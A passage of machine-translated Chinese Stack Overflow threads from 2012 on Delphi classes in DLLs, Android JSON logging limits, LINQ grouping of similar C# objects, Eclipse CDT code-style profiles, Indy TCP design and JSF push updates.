NavigateUrl='<%# DataBinder.Eval(Container.DataItem, "Id", "accounts_history.aspx?accountId={0}") %>' 
```

[http://msdn.microsoft.com/en-us/library/2d76z3ck.aspx](http://msdn.microsoft.com/en-us/library/2d76z3ck.aspx)

您应该只在属性中放置数据绑定表达式。

# delphi - 将类放入 DLL 中？

> ID：12954973
> 
> 赞同：7
> 
> 时间：2012-10-18T12:43:55.047
> 
> 标签：delphi, class, dll, delphi-xe

是否可以将某些类放入 DLL 中？

我正在处理的项目中有几个自定义类，希望将它们放入 DLL 中，然后在需要时在主应用程序中访问，另外，如果它们在 DLL 中，我可以在需要时在其他项目中重用这些类到。

我找到了这个链接：[http](http://www.delphipages.com/forum/showthread.php?t=84394) ://www.delphipages.com/forum/showthread.php?t= 84394，它讨论了访问 DLL 中的类，并提到了委托给类类型属性，但我找不到任何进一步的信息这在 Delphi 帮助或在线。

有什么理由我不应该将类放在 DLL 中，如果可以，那么在上面链接的示例中是否有更好的方法呢？

谢谢

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-10-18T17:00:46.043

无法从 DLL 中获取类/实例。您可以将接口交给类，而不是类。下面是一个简单的例子

```
// The Interface-Deklaration for Main and DLL
unit StringFunctions_IntfU;

interface

type
  IStringFunctions = interface
    ['{240B567B-E619-48E4-8CDA-F6A722F44A71}']
    function CopyStr( const AStr : WideString; Index, Count : Integer ) : WideString;
  end;

implementation

end. 
```

简单的DLL

```
library StringFunctions;

uses
  StringFunctions_IntfU; // use Interface-Deklaration

{$R *.res}

type
  TStringFunctions = class( TInterfacedObject, IStringFunctions )
  protected
    function CopyStr( const AStr : WideString; Index : Integer; Count : Integer ) : WideString;
  end;

  { TStringFunctions }

function TStringFunctions.CopyStr( const AStr : WideString; Index, Count : Integer ) : WideString;
begin
  Result := Copy( AStr, Index, Count );
end;

function GetStringFunctions : IStringFunctions; stdcall; export;
begin
  Result := TStringFunctions.Create;
end;

exports
  GetStringFunctions;

begin
end. 
```

现在是简单的主程序

```
uses
  StringFunctions_IntfU;  // use Interface-Deklaration

// Static link to external function
function GetStringFunctions : IStringFunctions; stdcall; external 'StringFunctions.dll' name 'GetStringFunctions';

procedure TMainView.Button1Click( Sender : TObject );
begin
  Label1.Caption := GetStringFunctions.CopyStr( Edit1.Text, 1, 5 );
end; 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-18T12:47:18.927

为此目的使用运行时包；这正是它们最初的设计目的。它们会自动加载（或可以手动加载），并自动设置同一个内存管理器的共享，以便您可以在它们之间自由使用类和类型。

使用包会更好（这正是 IDE 出于这个原因为其大部分功能所做的事情）。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-18T12:45:25.593

Delphi 不支持从 DLL 导入或导出类。要从另一个模块导入一个类，您需要使用包。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2015-01-20T09:16:16.033

虽然官方的回答是“*你不能*”，但当然一切皆有可能。Remobjects SDK 和 Remobjects Hydra 等框架已经这样做了很长时间。问题是它需要您围绕这样的系统创建一个基础设施，这不是 Delphi 开箱即用的处理方式。

第一步是内存管理。DLL 被注入到加载它的进程中，但它不共享内存管理。必须采用这种方式，因为可以用无数种语言创建 DLL，每种语言都有自己的内部机制。这带来了安全问题（即程序写入 DLL 内存，反之亦然）。

其次，界面（阅读：内容描述）。您的应用程序如何知道它可以创建哪些类、类成员、参数类型等。这就是为什么 COM 需要类型库来描述 DLL 的内容。

第三，终身管理。如果从 DLL 创建的对象的内存管理由 DLL 处理，则 DLL 还必须释放所述对象。

上述步骤已经存在，称为 COM。当然，您可以随意创建任意数量的 COM DLL 文件，但请记住，在使用它们之前，这些文件必须在 Windows 中注册。由您的应用程序（如果您有这样做的安全权限）或由您的安装程序“即时”执行。这就是为什么 COM 虽然代表了终极的插件系统，却很少被 Delphi 程序员使用，因为使用它作为插件系统的技术成本超过了收益。

**替代方式**

如果您可以确保您的 DLL 仅供 Delphi 程序使用，那么您有第二种方法可以探索。您必须创建方法来与 DLL 共享主程序的内存管理器（Remobjects 就是这样做的）。这允许您在 DLL 和主应用程序之间共享对象、字符串等。

然后，您可以使用 RTTI 来“映射”存储在 DLL 中的类（DLL 必须执行此操作并生成类和方法表），这些类可以通过您自己设备的代理类调用。

总而言之，除非你有足够的空闲时间可以浪费，否则我要么购买像 Remobjects Hydra 这样的系统 - 要么坚持使用软件包。但它可以用另一种方式完成吗？当然可以。但是以时间和努力为代价。

# android - 带有许多 Base64 字符串的 Android Web 服务响应 JSON 不起作用

> ID：12954974
> 
> 赞同：0
> 
> 时间：2012-10-18T12:43:58.060
> 
> 标签：android, json

在我的项目中，我使用 HttpClient 调用 URL 并获得带有 15-20 Base64 字符串的 JSON 响应。HttpClient 代码如下。

```
public static JSONObject TestHttpPost(String url,
            List<NameValuePair> nameValuePairs) {
        long t = System.currentTimeMillis();
        HttpClient client = new DefaultHttpClient();
        Log.i(TAG, "HTTPResponse received in ["
                + (System.currentTimeMillis() - t) + "ms]");
        HttpPost post = new HttpPost(url);

        try {

            post.setEntity(new UrlEncodedFormEntity(nameValuePairs));
            HttpResponse response = client.execute(post);
            BufferedReader rd = new BufferedReader(new InputStreamReader(
                    response.getEntity().getContent()));
            String resultString = convertStreamToString(rd);
            JSONObject jsonObjRecv = new JSONObject(resultString);
            Log.i(TAG, "<JSONObject>\n" + jsonObjRecv.toString()
                    + "\n</JSONObject>");

            return jsonObjRecv;

        } catch (Exception e) {
            return null;
        }

    }

    private static String convertStreamToString(BufferedReader reader) {
        StringBuilder sb = new StringBuilder();

        String line = null;
        try {
            while ((line = reader.readLine()) != null) {
                sb.append(line + "\n");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return sb.toString();
    } 
```

我面临以下问题

1.  当我使用 convertStreamToString() 处理响应时，我无法获得整个响应。

2 由于 Base64 字符串太大，StringBuilder 无法存储整个图像字符串。该函数只返回 JSON 的一小部分。而且要花太多时间来处理。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T15:18:39.480

Log.i() 在一定数量的字符后截断字符串的值。您可能收到了字符串，但无法打印。分块打印字符以解决问题。分配给 logcat 的环形缓冲区是 64k。

# c# - 如何在集合中找到相似的对象

> ID：12954976
> 
> 赞同：5
> 
> 时间：2012-10-18T12:44:01.653
> 
> 标签：c#, linq, find

我想根据**我实现的方法在集合中找到类似的对象**

例如这个示例类：

```
class myObj
{
    public int Data1 { get; set; }

    public int Data2 { get; set; }

    public int Data3 { get; set; }        
} 
```

然后在类中实现**类似**的方法：

```
public bool Similar(myObj obj)
{
    if (obj.Data1 == this.Data1 && obj.Data2 == this.Data2)
        return true;
    return false;
} 
```

现在我有这个集合：

```
List<myObj> items = new List<myObj>();
// none similar
items.Add(new myObj() { Data1 = 1, Data2 = 2, Data3 = 4 });
items.Add(new myObj() { Data1 = 2, Data2 = 3, Data3 = 18 });
items.Add(new myObj() { Data1 = 3, Data2 = 4, Data3 = 75 });
items.Add(new myObj() { Data1 = 4, Data2 = 2, Data3 = 3 });
//similar
items.Add(new myObj() { Data1 = 5, Data2 = 26, Data3 = 97 });
items.Add(new myObj() { Data1 = 5, Data2 = 26, Data3 = 37 });
items.Add(new myObj() { Data1 = 10, Data2 = 45, Data3 = 47 });
items.Add(new myObj() { Data1 = 10, Data2 = 45, Data3 = 19 }); 
```

为了得到类似的对象，我这样做了：

```
private static List<myObj> GetSimilars(List<myObj> items)
{
    List<myObj> similars = new List<myObj>();
    while (items.Count > 0)
    {
        var q = (from c in items
                 where c.Similar(items[0])
                 select c).ToList();

        if (q.Count > 1)
        {
            similars.AddRange(q);
            foreach (var obj in q)
                items.Remove(obj);
        }
        else
            items.Remove(items[0]);
    }    
    return similars;
} 
```

有更好的方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:53:02.480

试试这个：

```
private static List<myObj> GetSimilars(List<myObj> items)
{
    return items.SelectMany(x => items.Where(z => x != z && x.Similar(z))).ToList();
} 
```

或者如果你喜欢这个：

```
private static List<myObj> GetSimilars(List<myObj> items)
    {
        var result = from x in items
                     from y in items
                     where x != y && x.Similar(y)
                     select x;

        return result.ToList();
    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T13:01:04.033

`GroupBy`你可以用 Linq 的and做到这一切`SelectMany`：

```
var similarGroups = from i in items
                    group i by new { i.Data1, i.Data2 } into D1D2Group
                    where D1D2Group.Count() > 1
                    select D1D2Group;

foreach (var grp in similarGroups)
    Console.WriteLine("DataGroup:{0}/{1} Count:{2}"
               , grp.Key.Data1
               , grp.Key.Data2
               , grp.Count()); 
```

如果您想将组扁平化为 `List<myObj>`您的`GetSimilars`：

```
 List <myObj> similars = similarGroups.SelectMany(g => g).ToList(); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-18T13:26:26.497

如何制作这个可重用的类。

```
public class MyObjSimilarity : EqualityComparer<myObj>
{
    public override bool Equals(myObj a, myObj b)
    {
        if (obj.Data1 == this.Data1 && obj.Data2 == this.Data2)
        {
            return true;
        }

        return false;
    }

    public override int GetHashCode(myObj o)
    {
        int hash = 17;
        hash = hash * 23 + o.Data1.GetHashCode();
        hash = hash * 23 + o.Data2.GetHashCode();
        return hash;
    }
} 
```

你可以这样使用，

```
var similarity = new MyObjSimilarity();
items.Where(o => similarity.Equals(o, w)); 
```

或传递给字典的构造函数，

```
var similarity = new MyObjSimilarity();
var lookup = new Dictionary<myObj, string>(similarity); 
```

或在一个`GroupBy`

```
var similarity = new MyObjSimilarity();
items.GroupBy(o => o, o => o, similarity); 
```

或喜欢其他答案

```
var similarity = new MyObjSimilarity();
items.GroupBy(
    o => o,
    o => new { Instance = o, Count = Count(o) },
    similarity); 
```

或在其他框架友好的地方。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-18T12:54:19.133

```
return
    items.Where(w => items.Count(c => c.Similar(w)) > 1)
    /* add .Distinct() optional*/
    .ToList(); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-18T13:02:48.743

您可以实现 IComparable 接口或使用实现 IComparer 的自写比较器。如果你这样做，你可以对你的对象的任何列表进行排序。

这是一个小教程：http: [//support.microsoft.com/kb/320727/en](http://support.microsoft.com/kb/320727/en)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-10-18T13:04:07.280

要考虑在调用 GetSimilars 时修改项目列表的示例中的副作用，您必须这样做。为了摆脱副作用，松开 RemoveAll()

```
 private static List<myObj> GetSimilars(List<myObj> items)
 {
        var similars = from s in items
                 where items.Any(s2 => s != s2 && s.Similar(s2))
                 select s;

        items.RemoveAll(s => similars.Contains(s));

        return similars.ToList();
 } 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-10-18T12:51:21.183

使用 groupBy 来执行此操作，您可以根据项目的第一个和第二个值对项目进行分组，如下所示...

```
var GroupByValues=items.GroupBy(obj=> new { val1 = obj.Data1,val2=obj.Data2 }); 
```

然后您可以遍历该组以获取值...

# c++ - 我可以让 Eclipse 在没有任何手动步骤的情况下选择我的 C++ 代码样式吗？

> ID：12954980
> 
> 赞同：0
> 
> 时间：2012-10-18T12:44:14.723
> 
> 标签：c++, eclipse, configuration

我正在尝试通过外部工具在 Eclipse 中设置自定义 C++ 代码样式配置文件。我发现这是在文件中设置的：

`...\.metadata\.plugins\org.eclipse.core.runtime\.settings\org.eclipse.cdt.ui.prefs`

我已经设法在那里添加了我的代码样式配置文件。

当我启动 Eclipse 时，我的配置文件被选为下面的活动配置文件，`Preferences -> C/C++ -> Code Style`但是当我尝试在编辑器中执行某些操作时它仍然无法正常工作。我必须进入首选项并`Edit... -> OK`在我的个人资料中选择它才能被 Eclipse 获取。

有什么方法可以让 Eclipse 在启动时自动使用我的配置文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T13:57:11.793

是的。在同一个文件中查看`formatter_profile`选项。

例如：

```
formatter_profile=_Torsten 
```

此外，似乎`_`- 名称前需要下划线。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-22T08:30:46.287

还有一个文件必须存在代码样式配置文件：

`...\.metadata\.plugins\org.eclipse.core.runtime\.settings\org.eclipse.cdt.core.prefs`

完成后，配置文件将处于活动状态并在 Eclipse 启动时工作。

# delphi - 使用 Internet 将文件和消息从一个系统传输到远程系统

> ID：12954995
> 
> 赞同：1
> 
> 时间：2012-10-18T12:44:43.117
> 
> 标签：delphi, indy10

使用 Internet 将文件从客户端发送到远程服务器的最佳方式是哪一个（TCP/UDP）？即哪一个是我以下要求的快速可靠的。

我基本上有两个要求

```
1\. Sending Files from Client to Server (Daily Once)
2\. In Client system running one software, its having different product information, 
   latest packet Time, Product Status, etc . 
   This information is updated every one second. 
   My problem is, To know the Client status at server.

 I am not able to decided which design is best of my requirement. They are
   A.Using TIdTCPClient & TIdTCPServer 
   B.Using TIdTCPClient & TIdCmdTCPServer
   C.Using TIdCmdClient & TIdTCPServer
   D.Using TIdCmdClient & TIdCMDTCPServer 
```

请指导我哪种设计最好以及如何通过示例来实现它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:49:48.167

TCP/IP 速度较慢，但​​它可以确保您不会丢失任何数据包，而无需在应用程序中实现它

UDP 更快，但你不能保证数据包会到达，你必须实现某种确认

在您的情况下，我认为 TCP 是最好的，带有 TIdTCPServer 的 TIdTCPClient 可以解决问题。

如果遇到困难，请发布一些代码。

# java - 实时更新值？

> ID：12954998
> 
> 赞同：1
> 
> 时间：2012-10-18T12:44:54.083
> 
> 标签：java, jsf, jakarta-ee, push

如何在 JSF Java EE 应用程序中拥有推送机制？

我有几个后端值，有时可能每隔一秒，有时每隔一分钟，有时每小时只有一次。

我不想拉那个变量，因为当多个客户端连接到那个页面时这会很昂贵。

所以我不知何故需要一个推送机制来只更新前端的值，如果它们被改变。有谁知道我该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:58:37.480

您可以使用 Primefaces 推送

> PrimePush，由伟大的[Atmosphere Framework](https://github.com/Atmosphere/atmosphere)提供支持。

这里有一些参考：

[PrimeFaces Push Unleashed](http://blog.primefaces.org/?p=2053)

[PrimePush](http://www.primefaces.org/showcase/push/index.jsf)

[用户指南 3.4](http://primefaces.googlecode.com/files/primefaces_users_guide_3_4.pdf)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T14:45:41.340

您可以使用 RichFaces [a4j:push](http://showcase.richfaces.org/richfaces/component-sample.jsf?demo=push&sample=pushCdi&skin=blueSky)。客户端通过使用 WebSocket 连接或长轮询方法创建与服务器的永久连接。永久连接由[Atmosphere Framework](https://github.com/Atmosphere/atmosphere)管理。推送可以通过编程 API（主题）或使用 CDI 事件（@Push）来控制。代码非常精简。